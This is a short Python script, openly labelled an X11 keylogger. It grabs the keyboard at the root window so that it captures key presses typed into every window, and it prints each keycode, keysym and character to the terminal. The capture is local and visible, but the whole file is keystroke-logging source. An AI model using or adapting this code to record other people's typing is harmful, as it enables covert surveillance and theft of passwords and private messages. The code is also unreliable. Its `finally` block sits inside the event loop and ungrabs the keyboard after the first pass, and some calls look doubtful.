#!/usr/bin/env python3

import sys
from Xlib import display, X, XK

def main():
    """
    A simple X11 keylogger that prints the details of each key press.
    """
    # Establish a connection to the X server
    disp = display.Display()
    root = disp.screen().root

    print("--- X11 Keylogger Started ---")
    print("Press Ctrl+C in this terminal to stop.")
    print("-" * 30)

    # We need to grab the keyboard to receive events from all windows.
    # This is a significant security action.
    # owner_events = True:  Process events as if they were not grabbed.
    # pointer_mode = GrabModeAsync: Do not freeze the pointer.
    # keyboard_mode = GrabModeAsync: Do not freeze the keyboard.
    root.grab_keyboard(
        owner_events=True,
        pointer_mode=X.GrabModeAsync,
        keyboard_mode=X.GrabModeAsync,
        time=X.CurrentTime
    )

    # Loop indefinitely to receive events
    while True:
        try:
            # Get the next event from the server
            event = disp.next_event()

            # We are only interested in key press events
            if event.type == X.KeyPress:
                # Get the keycode (the physical key identifier)
                keycode = event.detail

                # Get the keysym (the symbolic name for the key)
                # The second argument (index) is for keys with multiple symbols
                # (e.g., a number key with a symbol). 0 is the base symbol.
                keysym = disp.keycode_to_keysym(keycode, 0)

                if keysym:
                    # Convert the numeric keysym value to a human-readable string
                    # e.g., 0xff0d becomes "Return"
                    key_string = XK.keysym_to_string(keysym)

                    # Get the character that would be typed (respecting Shift, etc.)
                    # This gives you the actual character like 'A' vs 'a'
                    char_lookup = event.lookup_string()

                    print(
                        f"Keycode: {keycode:<4} | "
                        f"Keysym Value: 0x{keysym:04x} | "
                        f"Keysym String: {key_string:<15} | "
                        f"Character: '{char_lookup}'"
                    )

        except (KeyboardInterrupt, SystemExit):
            # Cleanly exit when Ctrl+C is pressed
            print("\n--- X11 Keylogger Stopped ---")
            break
        except Exception as e:
            # Catch other potential errors
            print(f"An error occurred: {e}", file=sys.stderr)
            break
        finally:
            # Always make sure to ungrab the keyboard on exit
            disp.ungrab_keyboard(time=X.CurrentTime)
            disp.flush()


if __name__ == "__main__":
    main()